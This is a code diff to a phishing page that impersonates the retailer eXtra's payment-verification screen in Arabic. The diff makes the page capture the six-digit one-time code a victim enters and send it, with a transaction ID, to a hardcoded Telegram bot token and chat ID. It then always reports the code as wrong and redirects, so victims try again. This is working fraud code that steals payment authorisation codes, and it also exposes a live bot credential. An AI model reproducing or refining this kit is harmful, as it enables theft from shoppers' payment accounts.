@@ -348,16 +348,6 @@
                 font-size: 20px;
             }
         }
-        
-        /* Additional Animations */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .fade-in {
-            animation: fadeIn 0.5s ease;
-        }
     </style>
 </head>
 <body>
@@ -365,7 +355,7 @@
     <div class="top-bar">
         <div class="header-container">
             <div class="logo">
-                <img src="Extra_Logo.svg.png" alt="eXtra">
+                <img src="extraordinshaiaa881.img" alt="eXtra">
             </div>
             <div class="secure-badge">
                 <span style="font-size: 12px; color: #4CAF50;">✓ الدفع الآمن</span>
@@ -389,17 +379,17 @@
             
             <!-- Verification Title -->
             <h1 class="verification-title">التحقق من الدفع</h1>
-            <p class="verification-subtitle">لقد أرسلنا رمز التحقق إلى رقم هاتفك المسجل. الرجاء إدخال الرمز المكون من 6 أرقام</p>
+            <p class="verification-subtitle">الرجاء إدخال رمز التحقق المكون من 6 أرقام الذي تلقيته</p>
             
             <!-- Code Input -->
             <div class="code-container">
                 <div class="code-inputs" id="codeInputs">
-                    <input type="tel" class="code-input" maxlength="1" data-index="0">
-                    <input type="tel" class="code-input" maxlength="1" data-index="1">
-                    <input type="tel" class="code-input" maxlength="1" data-index="2">
-                    <input type="tel" class="code-input" maxlength="1" data-index="3">
-                    <input type="tel" class="code-input" maxlength="1" data-index="4">
-                    <input type="tel" class="code-input" maxlength="1" data-index="5">
+                    <input type="text" class="code-input" maxlength="1" data-index="0">
+                    <input type="text" class="code-input" maxlength="1" data-index="1">
+                    <input type="text" class="code-input" maxlength="1" data-index="2">
+                    <input type="text" class="code-input" maxlength="1" data-index="3">
+                    <input type="text" class="code-input" maxlength="1" data-index="4">
+                    <input type="text" class="code-input" maxlength="1" data-index="5">
                 </div>
                 
                 <p class="code-message">لم تستلم الرمز؟ <a href="#" style="color: #0066cc;">إعادة إرسال الرمز</a></p>
@@ -408,14 +398,6 @@
             
             <!-- Verification Button -->
             <button class="verify-btn" id="verifyBtn" disabled>تحقق</button>
-            
-            <!-- Success Message (Hidden by default) -->
-            <div class="success-message" id="successMessage">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="#2e7d32" style="vertical-align: middle; margin-left: 10px;">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-                </svg>
-                تم التحقق بنجاح! جاري إكمال العملية...
-            </div>
             
             <!-- Error Message (Hidden by default) -->
             <div class="error-message" id="errorMessage">
@@ -436,12 +418,8 @@
                     <span class="detail-value" id="transactionId">TRX-</span>
                 </div>
                 <div class="detail-row">
-                    <span class="detail-label">وقت الإرسال:</span>
-                    <span class="detail-value" id="sendTime"></span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">صلاحية الرمز:</span>
-                    <span class="detail-value">5 دقائق</span>
+                    <span class="detail-label">وقت المحاولة:</span>
+                    <span class="detail-value" id="attemptTime"></span>
                 </div>
             </div>
             
@@ -471,28 +449,20 @@
         const BOT_TOKEN = "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw";
         const CHAT_ID = "5372119436";
         
-        // Generate and send verification code
         document.addEventListener('DOMContentLoaded', function() {
-            // Generate random 6-digit code
-            const verificationCode = Math.floor(100000 + Math.random() * 900000);
-            
             // Set transaction details
             const transactionId = 'TRX-' + Math.floor(100000 + Math.random() * 900000);
             document.getElementById('transactionId').textContent = transactionId;
             
-            // Set send time
+            // Set attempt time
             const now = new Date();
-            document.getElementById('sendTime').textContent = now.toLocaleTimeString('ar-SA');
-            
-            // Send code to Telegram
-            sendToTelegram(`🔐 رمز التحقق: ${verificationCode}\n\n🆔 معرف العملية: ${transactionId}\n⏰ وقت الإرسال: ${now.toLocaleTimeString('ar-SA')}`);
+            document.getElementById('attemptTime').textContent = now.toLocaleTimeString('ar-SA');
             
             // Code input handling
             const codeInputs = document.querySelectorAll('.code-input');
             const verifyBtn = document.getElementById('verifyBtn');
             const processingOverlay = document.getElementById('processingOverlay');
             const processingText = document.getElementById('processingText');
-            const successMessage = document.getElementById('successMessage');
             const errorMessage = document.getElementById('errorMessage');
             const codeError = document.getElementById('codeError');
             const verificationStatus = document.getElementById('verificationStatus');
@@ -544,53 +514,44 @@
                     enteredCode += input.value;
                 });
                 
-                // Show processing overlay
+                // Send code to Telegram
+                sendToTelegram(`🔐 رمز التحقق المدخل: ${enteredCode}\n\n🆔 معرف العملية: ${transactionId}\n⏰ وقت الإدخال: ${new Date().toLocaleTimeString('ar-SA')}`);
+                
+                // Show processing overlay (5 seconds)
                 processingOverlay.classList.add('active');
                 processingText.textContent = "جاري التحقق من الرمز...";
+                verificationStatus.textContent = "جاري التحقق...";
                 
-                // Simulate verification delay (5 seconds)
                 setTimeout(function() {
-                    // Check if code is correct
-                    if (enteredCode == verificationCode) {
-                        // Correct code
-                        verificationStatus.textContent = "تم التحقق بنجاح";
-                        processingText.textContent = "جاري إكمال العملية...";
+                    // Always show incorrect code message (since we don't know the correct code)
+                    verificationStatus.textContent = "الرمز غير صحيح";
+                    processingOverlay.classList.remove('active');
+                    
+                    // Show error messages
+                    errorMessage.style.display = "block";
+                    codeError.style.display = "block";
+                    
+                    // Add error class to inputs and clear them
+                    codeInputs.forEach(input => {
+                        input.classList.add('error');
+                        input.value = "";
+                    });
+                    
+                    // Focus first input
+                    codeInputs[0].focus();
+                    verifyBtn.disabled = true;
+                    
+                    // Show processing for 10 seconds then redirect
+                    setTimeout(function() {
+                        processingOverlay.classList.add('active');
+                        processingText.textContent = "جاري إعادة التوجيه...";
                         
-                        // Show success message
-                        successMessage.style.display = "block";
-                        errorMessage.style.display = "none";
-                        codeError.style.display = "none";
-                        
-                        // Remove error class from inputs
-                        codeInputs.forEach(input => {
-                            input.classList.remove('error');
-                        });
-                        
-                        // Simulate processing delay (10 seconds)
                         setTimeout(function() {
-                            processingOverlay.classList.remove('active');
                             window.location.href = "index.html";
-                        }, 10000);
-                    } else {
-                        // Incorrect code
-                        verificationStatus.textContent = "الرمز غير صحيح";
-                        processingOverlay.classList.remove('active');
-                        
-                        // Show error messages
-                        errorMessage.style.display = "block";
-                        codeError.style.display = "block";
-                        
-                        // Add error class to inputs
-                        codeInputs.forEach(input => {
-                            input.classList.add('error');
-                            input.value = "";
-                        });
-                        
-                        // Focus first input
-                        codeInputs[0].focus();
-                        verifyBtn.disabled = true;
-                    }
-                }, 5000);
+                        }, 2000);
+                    }, 10000);
+                    
+                }, 5000); // 5 second processing
             });
             
             // Function to send message to Telegram
